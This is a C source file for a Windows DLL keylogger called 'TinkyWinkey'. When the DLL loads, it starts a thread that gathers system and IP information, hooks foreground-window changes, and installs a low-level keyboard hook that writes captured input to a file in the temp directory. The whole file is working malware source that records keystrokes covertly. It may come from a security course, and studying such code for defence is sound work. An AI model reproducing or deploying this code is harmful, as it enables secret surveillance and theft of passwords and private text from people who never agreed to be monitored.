#include "keylogger.h"

DWORD WINAPI ThreadFunc(LPVOID lpParam)
{
	(void)lpParam;

	if (!create_log_file()) // Create a log file for the program in case of errors
	{
		write_logs("Failed to create log file for the program.\n");
		return 1;
	}

	if (already_running())
		return 1;

	wchar_t tmpPath[MAX_PATH];

	GetTempPathW(MAX_PATH, tmpPath);
	wcscat_s(tmpPath, MAX_PATH, L"logs_tw.txt"); // Create a temporary file path

	fd = CreateFileW(tmpPath, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	if (fd != INVALID_HANDLE_VALUE)
		SetFilePointer(fd, 0, NULL, FILE_END); // Move to the end of the file
	else
	{
		write_logs("Failed to create log file  for the keylogger.\n");
		return 1;
	}

	write_to_file("TinkyWinkey started, getting system information...\n");
	get_windows_info();
	get_cpu_info();
	get_ip_address();
	get_ram_info();
	write_to_file("--------------------------------\n");
	HWINEVENTHOOK hook = SetWinEventHook(
		EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND,
		NULL,
		WinForeground,
		0, 0,
		WINEVENT_OUTOFCONTEXT | WINEVENT_SKIPOWNPROCESS);
	if (hook == NULL)
	{
		write_logs("Failed to set WinEventHook for foreground window.\n");
		return 1;
	}
	HHOOK hKeyboardHook = SetWindowsHookExW(
		WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0
	);
	if (hKeyboardHook == NULL)
	{
		write_logs("Failed to set Windows hook for keyboard events.\n");
		return 1;
	}

	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	UnhookWinEvent(hook);
	UnhookWindowsHookEx(hKeyboardHook);
	return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
	(void)hModule;
	(void)lpReserved;

	if (ul_reason_for_call == DLL_PROCESS_ATTACH)
	{

		DisableThreadLibraryCalls(hModule); // Prevent DLL_THREAD_ATTACH and DLL_THREAD_DETACH calls
		HANDLE hThread = CreateThread(NULL, 0, ThreadFunc, NULL, 0, NULL); // Create a new thread to run the keylogger
		if (hThread)
			CloseHandle(hThread);
	}
	return TRUE;
}
